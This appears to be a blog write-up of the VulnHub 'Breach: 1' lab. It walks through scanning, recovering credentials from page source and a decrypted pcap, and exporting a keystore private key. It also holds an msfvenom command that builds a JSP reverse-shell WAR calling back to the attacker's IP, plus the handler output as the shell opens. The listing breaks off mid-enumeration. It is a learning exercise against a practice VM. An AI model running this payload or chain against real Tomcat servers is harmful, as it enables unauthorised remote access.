
<!DOCTYPE HTML>
<html>
<head>
	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
	<meta charset="utf-8">
	<title>[VulnHub] Breach: 1  | F4l13n5n0w</title>

<meta name="author" content="F4l13n5n0w"> 

<meta name="description" content="This is a description"> <meta name="keywords" content="">

	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="F4l13n5n0w" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>

<script language="Javascript" type="text/javascript">
$(document).ready(
  function() {
    (function($) {
      $(".fancybox[data-content-id]").each(function() {
        this.href = $(this).data('content-id');
      });
      $(".fancybox").fancybox({
        beforeLoad: function() {
          var el, 
              id = $(this.element).data('title-id');

          if (id) {
            el = $('#' + id);

            if (el.length) {
              this.title = el.html();
            }
          }
          if ($(this).data('content')) {
            this.content = $(this).data('content');
          }
        },
        helpers: {
          title: {
            type: 'inside'
          }
        }
      });
    })(jQuery);
  }
);
</script>

	<link href='https://fonts.googleapis.com/css?family=Delius' rel='stylesheet' type='text/css'>
</head>



<body>
	<header id="header" class="inner"><h1><a href="/">F4l13n5n0w</a></h1>
<h4>Info Security & Pen Testing learning notes</h4>
<nav id="main-nav"><ul>
	<li><a href="/about">瓷 | About</a></li>
	<li><a href="/">段子 | Blogging</a></li>
	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
	<li><a href="/reading-list">藏♥品 | Reading</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul>
	<li><a href="/about">瓷 | About</a></li>
	<li><a href="/">段子 | Blogging</a></li>
	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
	<li><a href="/reading-list">藏♥品 | Reading</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:f4l13n5n0w.github.io">
			</form>
		</div>
	</div>
</nav>


</header>

	<div id="content" class="inner"><article class="post">
	<h2 class="title">[VulnHub] Breach: 1</h2>
	<div class="entry-content"><p>&ldquo;First in a multi-part series, Breach 1.0 is meant to be beginner to intermediate boot2root/CTF challenge. Solving will take a combination of solid information gathering and persistence. Leave no stone unturned.</p>

<p>The VM is configured with a static IP address (192.168.110.140) so you will need to configure your host-only adaptor to this subnet.&ldquo; &ndash; <a href="https://www.vulnhub.com/author/mrb3n,293/">mrb3n</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>192.168.110.129/24</em>)</p>

<p>Target: PwnLab: init (<em>192.168.110.140/24</em>)</p>

<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="https://www.wireshark.org/">wireshark</a></li>
<li><a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">exiftool</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>192.168.110.1 00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>192.168.110.2 00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>192.168.110.128   00:0c:29:5f:3b:1a   VMware, Inc.
</span><span class='line'>192.168.110.140   00:0c:29:f1:0a:9f   VMware, Inc.
</span><span class='line'>192.168.110.254   00:50:56:e9:0a:b5   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">5</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.421 seconds <span class="o">(</span>105.74 hosts/sec<span class="o">)</span>. <span class="m">5</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>192.168.110.140</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p>Since we got all ports open when doing <code>masscan</code> ports scan, that sounds like the server is located behind an IDS or IPS.</p>

<p>Without the auto-port scanner, I have to check ports manually. So I started from common ports and port 80 would be the first come out~</p>

<p><img class="left" src="/downloads/Breach1/1.png"></p>

<p>Good, the target is providing WEB service, so I run <code>nikto</code> to do an auto scan on port 80.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# nikto -host 192.168.110.140 -output 192.168.110.140_nikto.txt
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.110.140
</span><span class='line'>+ Target Hostname:    192.168.110.140
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2016-11-27 14:36:24 <span class="o">(</span>GMT11<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0x44a 0x534a04f49139d
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ No CGI Directories found <span class="o">(</span>use <span class="s1">&#39;-C all&#39;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
</span><span class='line'>+ IP address found in the <span class="s1">&#39;location&#39;</span> header. The IP is <span class="s2">&quot;127.0.1.1&quot;</span>.
</span><span class='line'>+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is <span class="s2">&quot;http://127.0.1.1/images/&quot;</span>.
</span><span class='line'>+ Apache/2.4.7 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.12<span class="o">)</span>. Apache 2.0.65 <span class="o">(</span>final release<span class="o">)</span> and 2.2.29 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
</span><span class='line'>+ OSVDB-3268: /images/: Directory indexing found.
</span><span class='line'>+ OSVDB-3268: /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ <span class="m">7535</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">11</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
</span><span class='line'>+ End Time:           2016-11-27 14:36:45 <span class="o">(</span>GMT11<span class="o">)</span> <span class="o">(</span><span class="m">21</span> seconds<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested
</span></code></pre></td></tr></table></div></figure>


<p>Here is a directory found <code>/images/</code>.</p>

<p><img class="left" src="/downloads/Breach1/2.png"></p>

<p>Download all the pictures and checked them by using <code>exiftool</code>, found one comment <code>coffeestains</code> in file <code>bill.png</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1/images# exiftool * <span class="p">|</span> grep -i -e <span class="s1">&#39;File Name&#39;</span> -e <span class="s1">&#39;Comment&#39;</span>
</span><span class='line'>File Name                       : bill.png
</span><span class='line'>Comment                         : coffeestains
</span><span class='line'>File Name                       : cake.jpg
</span><span class='line'>File Name                       : initech.jpg
</span><span class='line'>File Name                       : milton_beach.jpg
</span><span class='line'>File Name                       : swingline.jpg
</span><span class='line'>File Name                       : troll.gif
</span></code></pre></td></tr></table></div></figure>


<p>Took a note here, for now.</p>

<p>By checking the source code as follow, I noticed that there is a page called <code>initech.html</code> and some encoded text (looks like base64 encoded) in the comment.</p>

<p><img class="left" src="/downloads/Breach1/3.png"></p>

<p>After decoded twice of the string <code>Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</code>, I got the plaintext: <code>pgibbons:damnitfeel$goodtobeagang$ta</code> which highly possible to be a pair of username and password divided by <code>:</code>.</p>

<p>Take a note here, the username is <font color='red'><code>pgibbons</code></font> and the password is <font color='red'><code>damnitfeel$goodtobeagang$ta</code></font>.</p>

<p>Then moving on to the new page <code>initech.html</code>.</p>

<p><img class="left" src="/downloads/Breach1/4.png"></p>

<p><code>Employee portal</code> just outstanding on the menu, so heading into it and using the username and password found before, bingo!!</p>

<p>After get in, there are 3 new emails in the mailbox.</p>

<p><img class="left" src="/downloads/Breach1/5.png"></p>

<p>Got something suspectable In the 3rd message, and download the secret file <code>.keystore</code>.</p>

<p><img class="left" src="/downloads/Breach1/6.png"></p>

<p>Keep note here, and then search <code>ssl</code> in order to find more information about the new SSL certificate, and I got another message which disclosed a <code>pcap</code> file link, also the storepassword and keypassword are all set to <font color='red'><code>tomcat</code></font>.</p>

<p><img class="left" src="/downloads/Breach1/7.png"></p>

<p>Now downloaded the <code>pcap</code> file and opened it using wireshark, all the TCP stream is encrypted, so I need to import a certificate to decrypt.</p>

<p>Then I decided to back to the <code>.keystore</code> file and searched online, got that is tomcat certificate keystore file. Using <code>keytool</code> and the password <code>tomcat</code> to check it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# keytool -list -v -keystore keystore
</span><span class='line'>Enter keystore password:
</span><span class='line'>
</span><span class='line'>Keystore <span class="nb">type</span>: JKS
</span><span class='line'>Keystore provider: SUN
</span><span class='line'>
</span><span class='line'>Your keystore contains <span class="m">1</span> entry
</span><span class='line'>
</span><span class='line'>Alias name: tomcat
</span><span class='line'>Creation date: May 21, 2016
</span><span class='line'>Entry <span class="nb">type</span>: PrivateKeyEntry
</span><span class='line'>Certificate chain length: 1
</span><span class='line'>Certificate<span class="o">[</span>1<span class="o">]</span>:
</span><span class='line'>Owner: <span class="nv">CN</span><span class="o">=</span>Unknown, <span class="nv">OU</span><span class="o">=</span>Unknown, <span class="nv">O</span><span class="o">=</span>Unknown, <span class="nv">L</span><span class="o">=</span>Unknown, <span class="nv">ST</span><span class="o">=</span>Unknown, <span class="nv">C</span><span class="o">=</span>Unknown
</span><span class='line'>Issuer: <span class="nv">CN</span><span class="o">=</span>Unknown, <span class="nv">OU</span><span class="o">=</span>Unknown, <span class="nv">O</span><span class="o">=</span>Unknown, <span class="nv">L</span><span class="o">=</span>Unknown, <span class="nv">ST</span><span class="o">=</span>Unknown, <span class="nv">C</span><span class="o">=</span>Unknown
</span><span class='line'>Serial number: 60856e88
</span><span class='line'>Valid from: Sat May <span class="m">21</span> 03:51:07 AEST <span class="m">2016</span> <span class="k">until</span>: Fri Aug <span class="m">19</span> 03:51:07 AEST 2016
</span><span class='line'>Certificate fingerprints:
</span><span class='line'>   MD5:  C4:72:E6:B0:5F:58:CE:8B:B4:7E:2D:67:86:A9:52:A0
</span><span class='line'>   SHA1: D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53
</span><span class='line'>   SHA256: F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31
</span><span class='line'>   Signature algorithm name: SHA256withRSA
</span><span class='line'>   Version: 3
</span><span class='line'>
</span><span class='line'>Extensions:
</span><span class='line'>
</span><span class='line'><span class="c">#1: ObjectId: 2.5.29.14 Criticality=false</span>
</span><span class='line'>SubjectKeyIdentifier <span class="o">[</span>
</span><span class='line'>KeyIdentifier <span class="o">[</span>
</span><span class='line'>0000: <span class="m">47</span> 6B A3 <span class="m">37</span> ED A5 1F 0A   0D <span class="m">61</span> CA AA <span class="m">17</span> 9C F4 8C  Gk.7.....a......
</span><span class='line'>0010: <span class="m">10</span> <span class="m">64</span> <span class="m">87</span> DF                                        .d..
</span><span class='line'><span class="o">]</span>
</span><span class='line'><span class="o">]</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>*******************************************
</span><span class='line'>*******************************************
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>root@kali:~/myExercises/breach1#
</span></code></pre></td></tr></table></div></figure>


<p>Then trying to extract private key from the <code>keystore</code> <a href="http://stackoverflow.com/questions/2640691/how-to-export-private-key-from-a-keystore-of-self-signed-certificate" title="Export private key from keystore file">file</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# keytool -v -importkeystore -srckeystore keystore -srcalias tomcat -destkeystore myp12file.p12 -deststoretype PKCS12
</span><span class='line'>Enter destination keystore password:
</span><span class='line'>Re-enter new password:
</span><span class='line'>Enter <span class="nb">source </span>keystore password:
</span><span class='line'><span class="o">[</span>Storing myp12file.p12<span class="o">]</span>
</span><span class='line'>root@kali:~/myExercises/breach1# ls
</span><span class='line'>keystore  myp12file.p12  _SSL_test_phase1.pcap
</span></code></pre></td></tr></table></div></figure>


<p>check the private key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# openssl pkcs12 -in myp12file.p12 -nocerts -nodes
</span><span class='line'>Enter Import Password:
</span><span class='line'>MAC verified OK
</span><span class='line'>Bag Attributes
</span><span class='line'>    friendlyName: tomcat
</span><span class='line'>    localKeyID: <span class="m">54</span> <span class="m">69</span> 6D <span class="m">65</span> <span class="m">20</span> <span class="m">31</span> <span class="m">34</span> <span class="m">38</span> <span class="m">30</span> <span class="m">31</span> <span class="m">34</span> <span class="m">34</span> <span class="m">33</span> <span class="m">35</span> <span class="m">37</span> <span class="m">32</span> <span class="m">36</span> <span class="m">35</span>
</span><span class='line'>Key Attributes: &lt;No Attributes&gt;
</span><span class='line'>-----BEGIN PRIVATE KEY-----
</span><span class='line'>MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCjJXnELHvCEyTT
</span><span class='line'>ZW/cJb7sFuwIUy5l5DkBXD9hBgRtpUSIv9he5RbJQwGuwyw5URbm3pa7z1eoRjFW
</span><span class='line'>HLMVzKYte6AyyjUoWcc/Fs9fiu83+F0G36JmmFcxLFivVQwCHKhrajUc15i/XtCr
</span><span class='line'>ExEDNL0igM8YnCPq4J9lXrXUanLltR464F7cJdLbkqHiqRvoFiOQi9e3CIZ86uoY
</span><span class='line'>UNBupj2/njMFRuB7dEoeaQ/otHZIgCgjbP76I+/xyL/RkGxYuU0e1tpQiLxTi7kF
</span><span class='line'>nJ1Rd55Gd+DvzuBiI9F+fxa4+TSQvRvQEzJIKowbPw6h82Cd66yFju8c2AKiaDie
</span><span class='line'>F+AqVim3AgMBAAECggEBAIr2Ssdr1GY0hDODvUnY5MyXoahdobGsOVoNRvbPd0ol
</span><span class='line'>cUDBl/0MSOJZLr+7Apo3lbhEdEO4kkOEtlVQ0MGKtSkcmhFo5updvjbgqPYKk0Qr
</span><span class='line'>SqGmLuAQdoQt78Q4Pqg13MbRijfs8/BdRIPTE7SVYVxYNw4RQQ65EUv45gvuN7ur
</span><span class='line'>shV5WSHVaN5QyUHyOTKcvFuBqxb9Mfo2NtRGZCG2QuG8V/C+k2k8+Q+n2wDaOXw8
</span><span class='line'>sIWKVMHngOMcW1OBnM3ac/bTeI2+LI5cMsBZqYlLmkH1AOlnCgpH7389NbRQQJSo
</span><span class='line'>sExX51v5r2mmI1JdzszwQYqRfH7+nugDRjBEN2ztqFECgYEA4eBiLFP9MeLhjti8
</span><span class='line'>PDElSG4MVf/I9WXfLDU79hev7npRw8LE0rzPgawXOL8NhTbp8/X1D071bGaA3rCU
</span><span class='line'>oBEEPclXlSwXHroZVjJALDhaPrIfFT6gBXlb9wAYSzWYED4LKXDuddVChrTo4Lmx
</span><span class='line'>XaHb/KM7kpPuUWr+xccEEuNJBnMCgYEAuOduxGz2Ecd+nwATsZpjgG5/SwLL/rd0
</span><span class='line'>TEMNQbB/XUIOI8mZpw5Dn1y71qCijk/A+oVzohc6Dspso4oXLMy0b+HCFPTKuGgg
</span><span class='line'>Hf8QV5YbDg0urH8KNNEEH7Dx/C6cp6vVAcj6eQ2wOwW62yVY8gy2elWH0gte1BXl
</span><span class='line'>hHiKIaLueq0CgYEAoAwi4+/7Ny7gzhvKfQgBt+mqOgGM/jzZvnRV8VDlayAm8YP/
</span><span class='line'>fKcmjWZH6gCN7vdzHFcJ9nfnNJEI/UG3fhewnqscsOlV1ILe0xG2IN8pKsWBescu
</span><span class='line'>EdLlFAZwMFJgVhnwRMPtY3bhtZtYa2uIPqUiwEdVPc4uDmi276LNwyhjJPsCgYA7
</span><span class='line'>ANcO5TpMiB12vX6LURnpVNlX5WeVO5Nn9omXaavq5XY/o0hdz6ZyhxQFtDLLONX6
</span><span class='line'>23T/x2umZp/uO9WTXStC/IaDS24ZFFkTWV4spOCzRi+bqdpm6j/noP5HG9SviJyr
</span><span class='line'>Oif7Uwvmebibz7onWzkrpnl15Fz5Tpd0A0cI3sY87QKBgQDLZ9pl505OMHOyY6Xr
</span><span class='line'>geszoeaj4cQrRF5MO2+ad81LT3yoLjZyARaJJMEAE7FZxPascemlg9KR3JPnevIU
</span><span class='line'>3RdMGHX75yr92Sd8lNQvSO6RWUuRnc889xN1YrpPx5G1VppIFqTrcB0gAiREkeUA
</span><span class='line'>pHiPhbocjixKJz9xx+pG0jDkrg<span class="o">==</span>
</span><span class='line'>-----END PRIVATE KEY-----
</span><span class='line'>root@kali:~/myExercises/breach1#
</span></code></pre></td></tr></table></div></figure>


<p>Now I will <a href="https://support.citrix.com/article/CTX116557" title="Decrypt SSL/TLS Traffic using wireshark">import the Private key file</a> into <code>wireshark</code> in order to decrypt the SSL stream.</p>

<p><img class="left" src="/downloads/Breach1/8.png"></p>

<p>After imported the private key, I have to re-open the <code>pcap</code> file in wireshark, now the traffic is quite clear, then right click in wireshark and choose <code>Follow</code> &ndash;> <code>SSL Stream</code> to read the traffic clearly.</p>

<p><img class="left" src="/downloads/Breach1/9.png"></p>

<p>From here, got a HTTP Basic login credential in base64 encoded: <code>dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</code>.</p>

<p>After decoded it, i got the plaintext: <code>tomcat:Tt\5D8F(#!*u=G)4m7zB</code>, which username is <font color='red'><code>tomcat</code></font> and password is <font color='red'><code>Tt\5D8F(#!*u=G)4m7zB</code></font>.</p>

<p>And based on the first two lines above, the login URL should be <font color='red'><code>https://192.168.110.140:8443/_M@nag3Me/html</code></font>.</p>

<p>[<font color='red'>Note</font>] Here I could not load the page correctly via firefox directly, but when I use <code>burp proxy</code> as a proxy, I was able to add exception in the firefox to access the tomcat page.</p>

<p><img class="left" src="/downloads/Breach1/10.png"></p>

<p>Now I got in, from here, I could generate and upload an evil <code>.WAR</code> file or use metasploit to exploit automatically.</p>

<p>Using <code>msfvenom</code> to generate a WAR webshell by following commond [3]:</p>

<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=443 -f war &gt; shell.war</code></p>

<p>Then setup <code>msfconsole</code> to listen on and got a reverse shell back as soon as I triggerred.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>smsf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options <span class="o">(</span>java/jsp_shell_reverse_tcp<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  192.168.110.129  yes       The listen address
</span><span class='line'>   LPORT  <span class="m">443</span>              yes       The listen port
</span><span class='line'>   SHELL                   no        The system shell to use.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   <span class="m">0</span>   Wildcard Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; exploit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 192.168.110.129:443
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">4</span> opened <span class="o">(</span>192.168.110.129:443 -&gt; 192.168.110.140:37620<span class="o">)</span> at 2016-11-27 14:17:25 +1100
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>104<span class="o">(</span>tomcat6<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>112<span class="o">(</span>tomcat6<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>112<span class="o">(</span>tomcat6<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Great! got in. However, after spended couple of hours looking around in the system, I could not get any further.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>tomcat6@Breach:/home/milton<span class="nv">$ </span>s -al
</span><span class='line'>ls -al
</span><span class='line'>total 156
</span><span class='line'>drwxr-xr-x <span class="m">3</span> milton milton   <span class="m">4096</span> Jun  <span class="m">6</span> 15:34 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> root   root     <span class="m">4096</span> Jun  <span class="m">4</span> 19:24 ..
</span><span class='line'>-rw------- <span class="m">1</span> milton milton    <span class="m">234</span> Jun <span class="m">11</span> 18:15 .bash_history
</span><span class='line'>-rw-r--r-- <span class="m">1</span> milton milton    <span class="m">220</span> May <span class="m">20</span>  <span class="m">2016</span> .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> milton milton   <span class="m">3637</span> May <span class="m">20</span>  <span class="m">2016</span> .bashrc
</span><span class='line'>drwx------ <span class="m">2</span> milton milton   <span class="m">4096</span> May <span class="m">20</span>  <span class="m">2016</span> .cache
</span><span class='line'>-rw-rw-r-- <span class="m">1</span> milton milton   <span class="m">2245</span> May <span class="m">20</span>  <span class="m">2016</span> .keystore
